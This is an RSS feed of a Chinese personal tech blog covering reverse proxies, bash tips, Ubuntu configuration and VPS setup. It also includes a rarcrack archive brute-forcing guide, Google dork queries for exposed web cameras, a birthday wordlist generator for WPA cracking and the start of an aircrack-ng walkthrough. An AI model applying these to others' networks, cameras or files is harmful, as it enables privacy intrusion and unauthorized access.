代理的过程大概是这个样子的： 我上不了QQ，但是你可以上，所以我就把数据包发给你，你再帮我把数据包转给QQ服务器，当QQ服务器返回消息的时候，你再返回给我，这样你就充当了一个中间人的角色，也就是，代理。并不是多么难理解，就跟小时候传纸条差不多，中间传递的那个家伙就是我们的代理。
那么什么是反向代理？
有这样一种场景，你可以访问QQ的网站，但是我不行，我只能访问360的网站（先不要管为什么了）。但是我们之间的通信是畅通的，也就是说，我可以访问你的网站，那么，我该如何访问QQ呢？当然，我可以通过你这个跳板去上网，比如在你上面弄弄弄个VPN啊，ssh啊，但是如果你不让我这样做呢？你只开放了80端口给我，也就是说，我只能从你这里得到WWW的服务，这可如何是好？（不要问我为什么非要上QQ！）那么有一种办法就是你把QQ的内容抓取下来，放到80端口给我看，也就是说，我间接地通过你上了QQ。而你呢，就充当了反向代理的角色。注意，这里是间接上网，我表面上是访问的你，但是你再后端把QQ给抓过来了，所以，实质上我还是访问的QQ，这样说应该就会很好理解了。
为什么？ 那么，为什么需要用反向代理呢？
1. 服务器群的负载均衡 你有很多服务器对外提供服务，虽然说提供的服务都是一样的，但是每台服务器都有自己的IP啊，你不可能只让一台工作吧，那么怎样才能通过一个网址来调动所有的服务器都对外工作呢？这就需要反向代理了，设立一台主机对外开放，剩余的那些作为服务器群在后端负责处理数据，然后，当有请求发送到对外开放的主机上面时，这台主机就会通过算法去调动在后端的主机处理数据，然后把结果返回给客户，这样这台主机就仅仅起到了一个前台的作用，脏活累活什么的就交给了后面的那群主机们干了～前台作为调度员，是有责任处理好这些事务的，刚才说道通过算法进行处理，那么，究竟是什么算法呢？客官且听我慢慢说来。
[静态方法：仅根据算法本身实现调度：][balala]
 Round-robin（轮回调度） 我有十台肉鸡，啊不，是服务器，每台服务器的性能都差不多，所以我就采用了这个轮回查询算法，每当有新的业务进来了，前台的调度员就会每台服务器每台服务器的给分配任务，不会偏袒着谁，因为是按照次序来的，1号有任务就分给是2号，2号完了是3号，3号完了就让4号上，但是，如果4号要是挂了呢？这就需要我们设置一个fail_timeout，意思是如果服务器在这个时间里没能应答或者啥的，就把任务再分配给下一台肉鸡，啊不，主机。
 Weighted round-robin（加权轮回调度） 还是那十台主机，但是有的是Digitalocean的，有的是阿里云的，有的用的是SSD，有的还tm用软盘，有的CPU用的是i7，有的用的是8086&amp;hellip;性能不一样啊！要是按照上面的轮回算法，让一个超级电脑去等一台内存只有512M虚拟机，不能忍！所以，这时候就需要给我们的电脑加权了。好电脑就把权值分配的大一点，渣主机就把权值写小一点。这样前台在调度的时候就会按照他们的权值进行分配，主机A更快，那我就给他多分配点任务，主机B比较慢，那我分配任务的时候就少点。如果你还有兴趣了解，请谷歌“Weighted round-robin”。
 Source ip Hashing（源地址散列调度） 通俗点讲就是按照你的IP地址给你hash一个主机，然后这台主机就为你服务了，这种算法的优点是什么的？很明显的一对一金牌服务嘛！记得有一次CTF，出题的妖怪在后台部署了好多好多服务器，上传shell每次都会到不同的主机上，那么，你猜他们用的是什么调度方法？没错，反正不是这种。那么如果巧了，同一时间好多任务都给了一台主机，而这台主机又没反应咋弄？调度员也不是傻X，当服务器没有正常反应的时候，他就会给下一台主机分配这个任务了，涉及到很多算法的问题吧，我想。
 Destination ip Hashing（目标地址散列调度) 这种调度方法主要应用在缓存服务上面，如果好多主机访问的是同一台主机，那么前台调度员就会把这些主机看成同一类，把他们统统交给某一台服务器，怎么说呢，跟上面的哈希溯源正好相反着的，上面是一对一的服务，下面是一对多的服务。反正是缓存服务器嘛，性能肯定棒棒的，让他多做点事情也是没问题的。
  动态方法：根据算法及后端RS当前的负载状况实现调度：
啊发现这些东西已经跑题了，所以各位看官有兴趣了解的话就不要听我在这里白活了，链接上面有哦～ 虽然那些文字看起来皱巴巴的 =。=
2. 海外代理 这就跟海外代购差不多的，我想买化妆品，但是国内没有啊，我就让代购去买，买完了给我就行了。放在服务器上呢，比如说，我想上谷歌，但是伟大的防火墙不让啊，所以我就交给海外的一台主机，让它帮我访问谷歌，然后我在向这台主机请求资源，这样就达到了访问谷歌的目的。https://gg.kfd.me 上面的站是我搭建的google。
“哎等会儿，你说的这个反向代理和VPN啥的有什么区别，还有我用的Shadowsocks，Goagent，不也都可以实现这种功能吗？”
哦。
那我就来扯一扯他们之间的区别。要是让我详细讲，估计一天也讲不完（其实是不会QAQ）。那我就简单粗略的给大家说一下有啥不同。首先说下VPN，VPN可以理解为一条虚拟的网线，我上不去谷歌，但是我远在日本的女朋友可以上啊，所以我就让女朋友答了一个VPN服务器，我呢，就通过VPN这条虚拟的网线连接上了女朋友的电脑，当然就可以上谷歌啦，不仅可以上谷歌，而且还可以……嘿嘿嘿。
那么，shadowsocks和goagent呢，他们都是代理软件，原理类似于上面讲到的正向代理，但是，代理的主机是127.0.0.1，也就是你自己的主机，如果在浏览器上设置了代理的话，那么你浏览器的流量都会先在本机走一圈，也就是通过那些shadowsocks啊goagent啊走一遍，而goagent呢，是连接了外网的家伙，我这里的外网，指的是out of China 的网，当然，在国内部署Goagent也不是不可以，只是你上不了谷歌而已，上上百度啊，QQ啊，360啊还都是可以的。Goagent会把流经它的数据转发到你部署的服务器上，在通过服务器进行资源请求。我之前也写过一篇关于goagent的，感兴趣的可以看一下。Shadowsocks的原理类似，不在赘述。
怎样做？ 基本的配置Nginx我就不说了，网上一搜一大把，我在这里啰啰嗦嗦，大家也觉着没意思。如果说有什么需要注意的，那可能就是注意代理谷歌的时候不要被墙了你的域名。（我简直就是在作死……）
然后，我也不想做一个搬运工，把那些长篇大论以及图片复制粘贴过来，所以我就直接贴出配置文档以供大家参考，如果你把这份配置放在服务器上的话，你也会得到一个谷歌的反向代理以造福国人。顺便说下，kfd.me 这个域名是我的。
proxy_cache_path /var/www/cache/ levels=1:2 keys_zone=one:100m max_size=1g; proxy_cache_key $host$request_uri; upstream google{ server 74.</description>
    </item>
    
    <item>
      <title>let commmand was not found in bash?</title>
      <link>https://wrfly.kfd.me/posts/let-commmand-was-not-found-in-bash/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/let-commmand-was-not-found-in-bash/</guid>
      <description>要解决问题,首先要遇到问题.
在bash中运行下面一段代码:
#!/bin/bash #spawn.sh PIDS=$(pidof sh $0) P_array=($PIDS) echo $PIDS let &amp;#34;instances=${#P_array[*]}- 1&amp;#34; echo &amp;#34;$instancesinstance(s) of this script running.&amp;#34; echo &amp;#34;[Hit Ctl-C to exit.]&amp;#34;; echo sleep 1 sh $0 exit 0 你会得到什么?
运行错误?let命令找不到了? OK, 反正是运行不了, 当然, 除了第一句.
这是在高级bash脚本编程指南中的一个例子,但是在我的ubuntu中却报错了,为什么?
搜索了一下,发现这个let是bash的内建命令,什么意思呢?就是只有bash有这个命令,而sh, dash, 都没有这个命令.
如果想知道你电脑中到底有什么shell,可以通过
cat /etc/shells 这个命令来得知.
# /etc/shells: valid login shells /bin/sh /bin/dash /bin/bash /bin/rbash /bin/ksh93 /usr/bin/screen 但是我们在脚本第一行已经写明了要用bash运行啊,为什么还不可以?
Ok,请问,你运行的方式是什么呢? sh script.sh ? 这样还是用sh运行呀,而且Ubuntu中sh默认关联的shell是dash,并不是bash.所以才会出现 let command not found 这种情况.
(PS:最关键的一句! 倒数第二行! 脚本用了sh来运行自身, 所以才会在第二次循环运行时出现错误!</description>
    </item>
    
    <item>
      <title>一些小东西,关于alias</title>
      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E4%BA%9B%E5%B0%8F%E4%B8%9C%E8%A5%BF%E5%85%B3%E4%BA%8Ealias/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E4%BA%9B%E5%B0%8F%E4%B8%9C%E8%A5%BF%E5%85%B3%E4%BA%8Ealias/</guid>
      <description>alias 是一个设置别名的小工具~
具体可见维基百科
但是它只会解析别名, 也就是说, 如果你告诉它, 张三跟张麻子是一个人, 你说张三, 他就知道你说的是张麻子, 但是如果你告诉他张三欠我一块钱, 那他就gg了, 人家并不能理解张麻子欠你一块钱啊. 或许他会说: 等等, 一块钱是什么?
这里我遇到的问题是如何传递参数进去.
curl ipinfo.io/8.8.8.8 这条命令是查看 8.8.8.8 的ip所在地, 那么, 如果我设置了
alias ipadrs=&amp;#39;curl ipinfo.io/$1&amp;#39; 会不会成功?
当然不会, 因为他不知道, 也无法处理你给他传进去的 ip.
没有办法么?
当然不是.
这里用到的技巧是function命令.
首先定义一个function hi() #你也可以把这个function去掉, 如果你觉得啰嗦的话,毕竟系统知道这是一个函数而不是好吃的.
function hi(){ echo &amp;#34;Hello $1!&amp;#34; } 当然啦,你完全可以横着写:
function hi(){ echo &amp;#34;Hello $1!&amp;#34;;} #你也可以把这个function去掉, 并不像C那样声明一下返回值 然后你在命令行里输入
hi world 有点意思吧! 我们已经可以把参数传递进去了耶~
且慢! 如果你关闭了这个窗口, 你就会发现, 为毛行不通了?
那是必须的, 因为在这个shell中运行的是临时变量, 也就是说没有在文件中保存下来, 毕竟我们没有对文件进行操作啊, 所以呢, 就要把他记录下来, 然后每次运行的时候都会有这个function. 但是话又说回来, 往哪儿写呢?</description>
    </item>
    
    <item>
      <title>linux下暴力破解rar，zip文件</title>
      <link>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3rarzip%E6%96%87%E4%BB%B6/</link>
      <pubDate>Tue, 07 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3rarzip%E6%96%87%E4%BB%B6/</guid>
      <description>Linux暴力破解RAR，ZIP，7Z压缩包
rarcrack,其官方主页：http://rarcrack.sourceforge.net/
该软件用于暴力破解压缩文件的密码，但仅支持RAR, ZIP, 7Z这三种类型，其特点是可以使用多线程而且可以暂停与继续(会在当前目录生成一个xml文件，里面显示了正在尝试的一个密码)。
安装方法
首先从官网下载安装包，然后执行如下命令
$ tar -xjf rarcrack-0.2.tar.bz2 $ cd rarcrack-0.2.tar.bz2 $ make $ make install 使用方法
rarcrack 文件名 [--threads thread_num] [--type rar|zip|7z] 该软件还自带了测试样例，该目录内，执行 rarcrack test.rar &amp;ndash;threads 4 &amp;ndash;type rar ，等待一会儿即可得到结果。
如果要改变尝试的位置可以直接打开xml，修改当前密码那一行即可。
如果出现如下错误：
gcc -pthread rarcrack.c xml2-config --libs --cflags -O2 -o rarcrack /bin/sh: 1: xml2-config: not found In file included from rarcrack.c:21:0: rarcrack.h:25:48: 致命错误： libxml/xmlmemory.h：没有那个文件或目录 编译中断。 make: *** [all] 错误 1 则执行：
sudo apt-get install libxml2-dev libxslt-dev 安装相应的依赖包。</description>
    </item>
    
    <item>
      <title>Ubuntu开启休眠模式</title>
      <link>https://wrfly.kfd.me/posts/ubuntu%E5%BC%80%E5%90%AF%E4%BC%91%E7%9C%A0%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 06 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/ubuntu%E5%BC%80%E5%90%AF%E4%BC%91%E7%9C%A0%E6%A8%A1%E5%BC%8F/</guid>
      <description>在电源菜单中有一个sleep，那是睡眠，即
 计算机睡眠模式结合了待机和休眠的所有优点。将系统切换到睡眠状态后，系统会将内存中的数据全部转存到硬盘上的休眠文件中（这一点类似休眠），然后关闭除了内存外所有设备的供电，让内存中的数据依然维持着（这一点类似待机）。这样，当我们想要恢复的时候，如果在睡眠过程中供电没有发生过异常，就可以直接从内存中的数据恢复（类似待机），速度很快；但如果睡眠过程中供电异常，内存中的数据已经丢失了，还可以从硬盘上恢复（类似休眠），只是速度会慢一点。不过无论如何，这种模式都不会导致数据丢失。
 电脑睡眠
而休眠是指：
 休眠在计算机科学中的含义指在关闭计算机的同时保持其运行状态。
通过休眠，计算机将内存中的内容保存至硬盘或其它非易失存储器中，并在下次开机时从硬盘中将这些内容重新载入，使机器还原到与休眠前一致的状态。
当用作保存电池电量的手段时，休眠与睡眠模式类似，不过比后者节约更多的电量，代价则是从休眠中恢复时速度更慢（因为硬盘的速度比内存慢得多）。
 电脑休眠
 在Linux内核中，休眠功能通过swsusp实现，并被内建在2.6版以后的内核中。替代性的实现是TuxOnIce，在3.4版以后的内核中作为补丁存在。另一个替代性的实现是uswsusp。
 Linux默认不显示这个休眠选项，如果想要加进去的话（比如我有两个系统，一个ubuntu，一个win8，但是我不能让内存同使用有两种数据，但我还想开机速度更快些，并且保存原有的程序，那我就需要对系统进行休眠），可以这样做：
1.先测试下电脑是否支持休眠
sudo pm-hibernate 2.如果成功了，那就可以写入系统文件了
sudo -i cd **/var/lib**/polkit-1/localauthority/50-local.d/ vi com.ubuntu.enable-hibernate.pkla （PS：如果配置不成功的话，你可以换一下路径，把/var/lib/换成/etc）
3.将下列代码写入
[Re-enable hibernate by default in upower] Identity=unix-user:* Action=org.freedesktop.upower.hibernate ResultActive=yes [Re-enable hibernate by default in logind] Identity=unix-user:* Action=org.freedesktop.login1.hibernate ResultActive=yes 4.重启电脑</description>
    </item>
    
    <item>
      <title>Make-a-startup-script-in-Ubuntu</title>
      <link>https://wrfly.kfd.me/posts/make-a-startup-script-in-ubuntu/</link>
      <pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/make-a-startup-script-in-ubuntu/</guid>
      <description>There are many ways to make a script startup at boot. It&amp;rsquo;s quite easy to write a script. But the most important things are making it have the execute permission and making sure that your script&amp;rsquo;s path is correct.
To make it execute, you need to put this command in you terminal
chmod +x your_script.sh Be sure that you have write a ** absolute path ** in your script or you won&amp;rsquo;t get what you want.</description>
    </item>
    
    <item>
      <title>Nginx File not found 错误</title>
      <link>https://wrfly.kfd.me/posts/nginx-file-not-found-%E9%94%99%E8%AF%AF/</link>
      <pubDate>Sun, 15 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/nginx-file-not-found-%E9%94%99%E8%AF%AF/</guid>
      <description>本文转自:http://www.nginx.cn/562.html
略有修改.
使用php-fpm解析PHP，&amp;rdquo;No input file specified&amp;rdquo;，&amp;rdquo;File not found&amp;rdquo;是令nginx新手头疼的常见错误，原因是php-fpm进程找不到SCRIPT_FILENAME配置的要执行的.php文件，php-fpm返回给nginx的默认404错误提示。
比如网站default下没有test.php，访问这个文件时通过[抓包]可以看到返回的内容。(linux下可以通过 curl -I http://somesites.com/test.php来查看http头)
curl -I http://somesites.com/test.php HTTP/1.1 404 Not Found Server: nginx Date: Sun, 15 Mar 2015 12:18:16 GMT Content-Type: text/html Content-Length: 162 Connection: keep-alive 一般会返回一个404的错误页面,但是在某些情况下也会出现&amp;rdquo;File not found.&amp;ldquo;这条提示信息.
很多人不想用户直接看到这个默认的404错误信息，想自定义404错误.
给出解决办法前我们来先分析下如何避免出现这类404错误，然后再说如果遇到这种情况(比如用户输入一个错误不存在的路径)时,怎样做才能显示自定义的404错误页。
####一、错误的路径被发送到php-fpm进程####
出现这类错误，十个有九个是后端fastcgi进程收到错误路径(SCRIPT_FILENAME)，而后端fastcgi收到错误路径的原因大都是配置错误。
常见的nginx.conf的配置如下：  server { listen [::]:80; server_name example.com www.example.com; access_log /var/www/logs/example.com.access.log;
location / { root /var/www/example.com; index index.html index.htm index.php; } location /images { autoindex on; } location ~ \.</description>
    </item>
    
    <item>
      <title>syntax-for-SOCKS-proxy-in-apt-conf</title>
      <link>https://wrfly.kfd.me/posts/syntax-for-socks-proxy-in-apt-conf/</link>
      <pubDate>Sat, 14 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/syntax-for-socks-proxy-in-apt-conf/</guid>
      <description>在ubuntu下更新软件的时候,经常会遇到网络连接失败的情况,其实并不是服务器的问题,而是GFW在捣鬼,所以,我们不得不给apt-get加上一个代理,使其更新的时候可以通过代理访问.
HTTP代理 1.在/etc/apt/apt.conf里面添加如下代码:
Acquire::http::Proxy &#34;http://yourproxyaddress:proxyport&#34;; 再进行apt-get操作的时候就会通过代理访问目标服务器.
2.设置临时代理
切换root用户,在bash中输入: export http_proxy=http://yourproxyaddress:proxyport
如果要使用sudo apt-get的话,你需要在/etc/sudoers里面添加: Defaults env_keep = &amp;ldquo;http_proxy https_proxy ftp_proxy&amp;rdquo;
这样会在你sudo运行命令的时候保持原来的代理,不会因为切换了root用户而改变环境变量.
3.设置永久代理
在.bashrc文件里面添加如下代码:
http_proxy=http://yourproxyaddress:proxyport export http_proxy 保存文件,并重新打开终端.
PS:如果http代理需要认证的话,可以将原来的代码替换为:
http_proxy=http://username:password@yourproxyaddress:proxyport SOCKS代理 如果你没用http代理,而是用的 shadowsocks 或者 ssh -D 这样的代理,那么你就需要一个转发的软件了,因为apt-get默认是不支持socks代理的,尽管网上有些人将http替换为了socks,那样也是不管用的.
但是有种方法可以让 apt-get 走 socks 代理的流量, tsocks.
首先你要安装tsocks.
sudo apt-get install tsocks 然后在/etc/tsocks.cong的最下面设置好socks代理的服务器以及端口号.
然后就可以使用代理了,具体操作如下:
$ sudo -s # tsocks apt-get dist-upgrade # exit $ 或者这样:
$ sudo -s # . tsocks -on # apt-get dist-upgrade # .</description>
    </item>
    
    <item>
      <title>VPS总结</title>
      <link>https://wrfly.kfd.me/posts/vps%E6%80%BB%E7%BB%93/</link>
      <pubDate>Tue, 10 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/vps%E6%80%BB%E7%BB%93/</guid>
      <description>有了VPS可以干什么 前几天买了Digitalocean家的一台VPS，新加坡的最快，尽管很多人说旧金山的稳定。
买VPS的初衷是用来翻墙，搭建一个VPN什么的，因为我也不知道有了VPS可以干嘛，除了翻墙。
我电脑一直用着Goagent，php代理，香港的一台主机，当然，这也得多亏了coding团队的奉献，我也是借着人家的付出才翻得墙，虽然我知道他们不允许搭建代理应用&amp;ndash;。不道德吧，有点儿。
手机原来用的是别人的shadowsocks，但是不知道为什么，那位好心人又把服务器关了，所以我借用的shadowsocks也不能用了，无奈之下才要买VPS，当然，只花了$5，因为github对教育的优惠。
https://www.digitalocean.com/?refcode=642012c0a066
这个是我的邀请链接，通过这个邀请链接注册之后，你会有十美元到账。之后就是通过paypal充5美元进去，这里需要用到绑定银行卡，然后账户里就有十五美元了～至少能用三个月呢～三十块钱，三个月的VPS，还是蛮划算的～
然后我就来总结一下我搭建完这台VPS的经验吧。（顺便说一句，百度真是越来越垃圾了，出了搜索广告很牛逼，别的，真是不敢恭维。）
学东西去官网，问问题去社区。这是我最到的收获之一。
Login 新建了VPS，第一步当然是要登陆，可是问题来了，怎么登陆？
Option 1. 密码
你可以用digitalocean自带的发送一封密码邮件到你的邮箱里，接收root的密码。然后用ssh登陆：ssh root@your_vps_ip 然后输入密码就可以了。进入之后更改密码。
Option 2. 密钥
SSH Key是专用的名词，我翻译成密钥请不要打我。
现在本地生成一对密钥，把 key.pub 粘贴到Digitalocean上，然后用你的私钥连接。 Details 妈蛋人家说的实在是太详细了，就连锁定SSH Key访问都说了。我就不在这里罗嗦了。一步一步来，总没有错的。
进入了VPS之后，你得到的就是一个黑框，当然，也可以是绿的。
命令行操作，不多说。
先更新软件：
然后就可以安装你想安装的东西了。
Shadowsocks 安装shadowsocks的话，还是得看官方教程：Click me
系统没有安装pip，要先自己安一下apt-get install pip
然后我建议是在/opt目录下安装各种东西，给每一个软件mkdir一个文件夹，相关的文件全都放进去，查找的时候也好找。
总之，不会的就去google，记得要用英文搜索。
最重要的一点是开机启动的问题，我试了很多方法单就是不成功，不管是放在/etc/rc.local还是在/etc/init.d/里面，都不能够成功的开机启动，可能是我的脚本有问题吧。影响也不大，服务器又不是经常开机～
安装VPN 我尝试过安装OpenVpn,从互联网的某个角落找到了一个一键安装的脚本，但是苦于不会弄，失败了。 我相信聪明的你一定会成功的。
然后我就尝试了PPTP，详细的链接在这里，很详细了。那里面的第五步之后的全是客户端的配置，其实我们不用管，因为有图形化界面，自己添加一个VPN就好了，IP地址，用户名，密码。很感谢那些写教程的人。谢谢。
Nginx或者Apache 既然是服务器那就少不了这两个大神，选择一个，然后安上，或者全部都要，但一定要记得更改默认端口，因为只能有一个开启80端口，另一个请改成8080或者其他的。这样才不会产生冲突。当然，如果你不做反代理什么的，没必要开俩。
具体的安装步骤很简单，我不罗嗦。就是在配置的时候会有些麻烦，不过，既然我们有搜索引擎，那他们就该发挥他们的作用。搜一下，你会找到答案的。
这里我要说的是，虚拟主机。
以前我也不知道那些虚拟主机是怎么搞的，windows下的好理解，开端口或者图形化处理，都是很简单，那么linux下的要怎么弄？其实也很简单，无非就是在配置文件里添加一个name而已，在/etc/nginx/sites-enabled/里面，放着的是已经启用的网站，一般这里面的文件全是/etc/nginx/sites-available里面的软连接。
在里面放一个文件，比如，virtualhost：  server { listen 80;
root /var/www/virtualhost/html; index index.html index.htm; server_name yourdomain.com www.yourdomain.com; #这里的yourdomain.com就是你要解析到这台服务器上的地址，你在domain管理里面将网址A记录解析到这台服务器的IP就Ok了。 } } 
关于那些php的配置，不在这里累赘。我把配置贴出来，照着葫芦画瓢吧～</description>
    </item>
    
    <item>
      <title>interesting-web-cameras</title>
      <link>https://wrfly.kfd.me/posts/interesting-web-cameras/</link>
      <pubDate>Wed, 18 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/interesting-web-cameras/</guid>
      <description>google search:
 inurl:CgiStart?page=Multi inurl:ViewerFrame?Mode=  or just visit
 http://webcamcity.gosnippy.com</description>
    </item>
    
    <item>
      <title>趣文:-有趣的-Linux-命令</title>
      <link>https://wrfly.kfd.me/posts/%E8%B6%A3%E6%96%87-%E6%9C%89%E8%B6%A3%E7%9A%84-linux-%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Tue, 10 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E8%B6%A3%E6%96%87-%E6%9C%89%E8%B6%A3%E7%9A%84-linux-%E5%91%BD%E4%BB%A4/</guid>
      <description>1.sl 命令
你会看到一辆火车从屏幕右边开往左边……
安装
$ sudo apt-get install sl 运行
$ sl 命令有 -a l F e 几个选项，
-a An accident seems to happen. You&amp;rsquo;ll feel pity for people who cry for help.
-l shows little one.
-F It flies.
-e Allow interrupt by Ctrl+C.
可以给别人来个恶作剧，他一敲ls，不知道的肯定很有效果
$alias ls=sl 2.fortune 命令
输出一句话，有笑话，名言什么的 (还有唐诗宋词sudo apt-get install fortune-zh)
安装
$sudo apt-get install fortune 运行
$fortune 3.cowsay 命令
用ASCII字符打印牛，羊等动物，还有个cowthink，这个是奶牛想，那个是奶牛说，哈哈，差不多
安装
$sudo apt-get install cowsay 运行</description>
    </item>
    
    <item>
      <title>Bash-Shortcuts</title>
      <link>https://wrfly.kfd.me/posts/bash-shortcuts/</link>
      <pubDate>Fri, 06 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/bash-shortcuts/</guid>
      <description>The shortcuts listed here are based on GNU bash version 3.00. The abbreviation of &amp;ldquo;CTRL-a&amp;rdquo; means to press and hold down the Control key and press &amp;lsquo; a &amp;rsquo; once. The shortcuts should be the same for most other shells.
The basic moving shortcuts allow movement to the end of the line, to the start of the line or to step through by character. The commands come in really handy when editing different file in another directory or copying files.</description>
    </item>
    
    <item>
      <title>Bash快捷键相关</title>
      <link>https://wrfly.kfd.me/posts/bash%E5%BF%AB%E6%8D%B7%E9%94%AE%E7%9B%B8%E5%85%B3/</link>
      <pubDate>Thu, 05 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/bash%E5%BF%AB%E6%8D%B7%E9%94%AE%E7%9B%B8%E5%85%B3/</guid>
      <description>bash快捷操作
生活在 Bash shell 中，熟记以下快捷键，将极大的提高你的命令行操作效率。
编辑命令
Ctrl + a ：移到命令行首 Ctrl + e ：移到命令行尾 Ctrl + f ：按字符前移（右向） Ctrl + b ：按字符后移（左向） Alt + f ：按单词前移（右向） Alt + b ：按单词后移（左向） Ctrl + xx：在命令行首和光标之间移动 Ctrl + u ：从光标处删除至命令行首 Ctrl + k ：从光标处删除至命令行尾 Ctrl + w ：从光标处删除至字首 Alt + d ：从光标处删除至字尾 Ctrl + d ：删除光标处的字符 Ctrl + h ：删除光标前的字符 Ctrl + y ：粘贴至光标后 Alt + c ：从光标处更改为首字母大写的单词 Alt + u ：从光标处更改为全部大写的单词 Alt + l ：从光标处更改为全部小写的单词 Ctrl + t ：交换光标处和之前的字符 Alt + t ：交换光标处和之前的单词 Alt + Backspace：与 Ctrl + w 类似 重新执行命令</description>
    </item>
    
    <item>
      <title>linux下的360wifi</title>
      <link>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E7%9A%84360wifi/</link>
      <pubDate>Wed, 04 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E7%9A%84360wifi/</guid>
      <description>今天把之前买过的一个360wifi放在了linux下，网上很多教程，我也走了很多弯路，不过，感谢那些前辈，让生活变得更美好～
thank you very much!
直接贴网址吧，英文的，很容易懂。
亲测可用，系统环境：Linux ubuntu 3.13.0-44-generic 以及 Linux kali 3.14-kali1-amd64
http://askubuntu.com/questions/575413/ralink-148f760b-mt7601-driver-kernel-panic-on-ubuntu-14-04
以上是问题的详情，下面的是github的网址：
https://github.com/porjo/mt7601.git
https://github.com/porjo/mt7601
感谢！
同样，这代码也应该适用于腾讯wifi，小度wifi，小米wifi等相同产品，不过本人没有亲自测试。
如果这篇文章对您有用，请把他分享给更多的人，如果在便以过程中与到了什么问题，也可以在下方留言，我们一起进行讨论～
然后，我所有的步骤全是从google上找到的，感谢google～同时鄙视一下百度、、
百度搜索到的一些教程在我的电脑上并不实用，很有可能是内核版本的问题，不过，我的内核版本可是最新的呀。。。。
转载请注明出处，谢谢。
10-30日更：
之前写过一个kali安装360wifi的脚本： https://gist.github.com/wrfly/08da52c72904de2400e7
多亏了一个同学提醒我～</description>
    </item>
    
    <item>
      <title>破解Wifi密码的时候</title>
      <link>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99/</link>
      <pubDate>Tue, 03 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99/</guid>
      <description>破解wpa/wpa2的密码是一件简单的事情但不是一件容易的事情。
遇到的第一个问题就是密码库，鉴于很多人喜欢把生日作为密码，那么我就从生日开始猜测了。
先写一个生成密码的小程序：
#include &amp;lt;iostream&amp;gt;#include &amp;lt;iomanip&amp;gt;using namespace std; int main(){ int y = 1970; for(; y &amp;lt; 2016; y ++) for(int m = 1; m &amp;lt; 13; m ++) if(m == 2) for(int d = 1; d &amp;lt; 30; d ++) cout&amp;lt;&amp;lt;y&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;m&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;d&amp;lt;&amp;lt;endl; else if(m == 4|| m == 6|| m == 9|| m == 11) for(int d = 1; d &amp;lt; 31; d ++) cout&amp;lt;&amp;lt;y&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;m&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;d&amp;lt;&amp;lt;endl; else for(int d = 1; d &amp;lt; 32; d ++) cout&amp;lt;&amp;lt;y&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;m&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;d&amp;lt;&amp;lt;endl; return 0; } 生成的密码文件在这儿</description>
    </item>
    
    <item>
      <title>破解Wifi密码的时候-2</title>
      <link>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99-2/</link>
      <pubDate>Tue, 03 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99-2/</guid>
      <description>上一篇中我说了制作生日密码的小程序，记录了一下字典的生成方式，那么这一篇中我摘抄了网上的教程，一步一步走下来，还是挺简单的。原本着想从视频中学习点东西，但是看了这篇教程以后发现文字版的更适合我～
我也希望会适合你～
PS：非法破解他人密码是违法行为，本人一切行为均在自己手机中进行。请大家测试的时候遵守法律法规。
此文分享自shellhacks
0.安装 Aircrack-ng
$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev 下载最新版的 Aircrack-ng：
 $ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc1.tar.gz -O - | tar -xz $ cd aircrack-ng-1.2-rc1 $ sudo make $ sudo make install  1.打开网卡的监听模式
首先结束可能会导致问题的进程：
$ sudo airmon-ng check kill 然后开启网卡监听模式：
$ sudo airmon-ng start wlan0 看一下现在的网卡在mon0上是打开的监听模式的。
 打开Airodump-ng来收集认证信息
